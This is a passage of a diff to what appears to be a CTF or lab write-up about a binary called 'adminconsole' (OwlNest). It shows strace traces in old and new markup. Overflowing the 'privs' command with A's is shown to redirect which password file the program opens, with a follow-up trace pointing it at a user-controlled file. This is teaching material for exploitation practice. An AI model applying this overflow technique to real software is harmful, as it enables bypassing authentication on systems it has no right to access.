-write(1, &ldquo;   &mdash;&ndash;<code>\"\" \"\"</code>&mdash;<code>\"\" \"\"</code>&mdash;<code>\"\" "..., 70   -----</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;`&mdash;
-) = 70
-write(1, &rdquo;        \<strong>V</strong>/   \<strong>V</strong>/   \<strong>V&#8221;&hellip;, 69        __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V__/</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# strace ./adminconsole
+</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./adminconsole&quot;</span>, <span class="o">[</span><span class="s2">&quot;./adminconsole&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">19</span> vars */<span class="o">])</span> <span class="o">=</span> 0
+</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;pwk&quot;</span>, ...<span class="o">})</span>   <span class="o">=</span> 0
+</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x9407000
+</span><span class='line'>brk<span class="o">(</span>0x9407cd0<span class="o">)</span>                          <span class="o">=</span> 0x9407cd0
+</span><span class='line'>set_thread_area<span class="o">({</span>entry_number:-1 -&gt; 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>brk<span class="o">(</span>0x9428cd0<span class="o">)</span>                          <span class="o">=</span> 0x9428cd0
+</span><span class='line'>brk<span class="o">(</span>0x9429000<span class="o">)</span>                          <span class="o">=</span> 0x9429000
+</span><span class='line'>fstat64<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb775e000
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        (\\___/)   (\\___/)   (\\__&quot;</span>..., <span class="m">67</span>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        /0\\ /0\\   /o\\ /o\\   /0\\ &quot;</span>..., <span class="m">67</span>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">67</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       /|:. .:|\\ /|;, ,;|\\ /|:. &quot;</span>..., <span class="m">68</span>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       \\\\:::::// \\\\;;;;;// \\\\:::&quot;</span>..., <span class="m">68</span>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;   -----`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; &quot;</span>..., <span class="m">70</span>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 70
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">69</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 69
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;This is the OwlNest Administrati&quot;</span>..., 46This is the OwlNest Administration console
+</span><span class='line'>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 46
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Type Help for a list of availabl&quot;</span>..., 47Type Help <span class="k">for</span> a list of available commands.
+</span><span class='line'>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 47
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'>fstat64<span class="o">(</span>0, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb775d000
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, username root
+</span><span class='line'><span class="s2">&quot;username root\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'><span class="s2">&quot;privs AAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>..., 1024<span class="o">)</span> <span class="o">=</span> 96
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, password hello
+</span><span class='line'><span class="s2">&quot;password hello\n&quot;</span>, 1024<span class="o">)</span>       <span class="o">=</span> 15
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &quot;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/root/password.txt&quot;</span>, O_RDONLY<span class="o">)</span>    <span class="o">=</span> 3
+</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb775c000
+</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>_llseek<span class="o">(</span>3, 0, <span class="o">[</span>0<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>3, <span class="s2">&quot;cunt\n&quot;</span>, 5<span class="o">)</span>                    <span class="o">=</span> 5
+</span><span class='line'>_llseek<span class="o">(</span>3, 5, <span class="o">[</span>5<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
+</span><span class='line'>close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> 0
+</span><span class='line'>munmap<span class="o">(</span>0xb775c000, 4096<span class="o">)</span>                <span class="o">=</span> 0
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, ^C &lt;unfinished ...&gt;
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>) = 69
-write(1, &ldquo;This is the OwlNest Administrati&rdquo;&hellip;, 46This is the OwlNest Administration console</p>
-
-<p>) = 46
-write(1, &ldquo;Type Help for a list of availabl&rdquo;&hellip;, 47Type Help for a list of available commands.</p>
-
-<p>) = 47
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
-read(0, username root
-&ldquo;username root\n&rdquo;, 1024)        = 14
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-&ldquo;privs AAAAAAAAAAAAAAAAAAAAAAAAAA&rdquo;&hellip;, 1024) = 96
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, password hello
-&ldquo;password hello\n&rdquo;, 1024)       = 15
-open(&ldquo;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
-open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
-fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775c000
-fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
-<em>llseek(3, 0, [0], SEEK_SET)            = 0
-read(3, &ldquo;cunt\n&rdquo;, 5)                    = 5
-</em>llseek(3, 5, [5], SEEK_SET)            = 0
-close(3)                                = 0
-munmap(0xb775c000, 4096)                = 0
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, ^C <unfinished ...>
-root@pwk:~# [/plain]</p>
 
 <p>However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can&hellip;</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# strace ./adminconsole
-execve(&ldquo;./adminconsole&rdquo;, [&ldquo;./adminconsole&rdquo;], [/<em> 19 vars </em>/]) = 0
-uname({sys=&ldquo;Linux&rdquo;, node=&ldquo;pwk&rdquo;, &hellip;})   = 0
-brk(0)                                  = 0x84b0000
-brk(0x84b0cd0)                          = 0x84b0cd0
-set_thread_area({entry_number:-1 -> 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
-brk(0x84d1cd0)                          = 0x84d1cd0
-brk(0x84d2000)                          = 0x84d2000
-fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7717000
-write(1, &ldquo;        (\<strong><em>/)   (\</em></strong>/)   (\<strong>&rdquo;&hellip;, 67        (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)
-) = 67
-write(1, &ldquo;        /0\ /0\   /o\ /o\   /0\ &rdquo;&hellip;, 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
-) = 67
-write(1, &ldquo;        \</strong>V<strong>/   \</strong>V<strong>/   \</strong>V&rdquo;&hellip;, 67        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
-) = 67
-write(1, &ldquo;       /|:. .:|\ /|;, ,;|\ /|:. &rdquo;&hellip;, 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
-) = 68
-write(1, &ldquo;       &#92;:::::// &#92;;;;;;// &#92;:::&rdquo;&hellip;, 68       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
-) = 68
-write(1, &ldquo;   &mdash;&ndash;<code>\"\" \"\"</code>&mdash;<code>\"\" \"\"</code>&mdash;<code>\"\" "..., 70   -----</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;`&mdash;
-) = 70
-write(1, &rdquo;        \<strong>V</strong>/   \<strong>V</strong>/   \<strong>V&#8221;&hellip;, 69        __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V__/</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# strace ./adminconsole
+</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./adminconsole&quot;</span>, <span class="o">[</span><span class="s2">&quot;./adminconsole&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">19</span> vars */<span class="o">])</span> <span class="o">=</span> 0
+</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;pwk&quot;</span>, ...<span class="o">})</span>   <span class="o">=</span> 0
+</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x84b0000
+</span><span class='line'>brk<span class="o">(</span>0x84b0cd0<span class="o">)</span>                          <span class="o">=</span> 0x84b0cd0
+</span><span class='line'>set_thread_area<span class="o">({</span>entry_number:-1 -&gt; 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>brk<span class="o">(</span>0x84d1cd0<span class="o">)</span>                          <span class="o">=</span> 0x84d1cd0
+</span><span class='line'>brk<span class="o">(</span>0x84d2000<span class="o">)</span>                          <span class="o">=</span> 0x84d2000
+</span><span class='line'>fstat64<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7717000
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        (\\___/)   (\\___/)   (\\__&quot;</span>..., <span class="m">67</span>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        /0\\ /0\\   /o\\ /o\\   /0\\ &quot;</span>..., <span class="m">67</span>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">67</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       /|:. .:|\\ /|;, ,;|\\ /|:. &quot;</span>..., <span class="m">68</span>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       \\\\:::::// \\\\;;;;;// \\\\:::&quot;</span>..., <span class="m">68</span>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;   -----`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; &quot;</span>..., <span class="m">70</span>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 70
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">69</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 69
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;This is the OwlNest Administrati&quot;</span>..., 46This is the OwlNest Administration console
+</span><span class='line'>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 46
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Type Help for a list of availabl&quot;</span>..., 47Type Help <span class="k">for</span> a list of available commands.
+</span><span class='line'>
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 47
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'>fstat64<span class="o">(</span>0, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7716000
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, username root
+</span><span class='line'><span class="s2">&quot;username root\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, privs /home/meh/password.txt
+</span><span class='line'><span class="s2">&quot;privs /home/meh/password.txt\n&quot;</span>, 1024<span class="o">)</span> <span class="o">=</span> 29
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, password arse
+</span><span class='line'><span class="s2">&quot;password arse\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;rd.txt&quot;</span>, O_RDONLY<span class="o">)</span>                <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/root/password.txt&quot;</span>, O_RDONLY<span class="o">)</span>    <span class="o">=</span> 3
+</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7715000
+</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>_llseek<span class="o">(</span>3, 0, <span class="o">[</span>0<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>3, <span class="s2">&quot;blah\n&quot;</span>, 5<span class="o">)</span>                    <span class="o">=</span> 5
+</span><span class='line'>_llseek<span class="o">(</span>3, 5, <span class="o">[</span>5<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
+</span><span class='line'>close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> 0
+</span><span class='line'>munmap<span class="o">(</span>0xb7715000, 4096<span class="o">)</span>                <span class="o">=</span> 0
+</span></code></pre></td></tr></table></div></figure>
 
-<p>) = 69
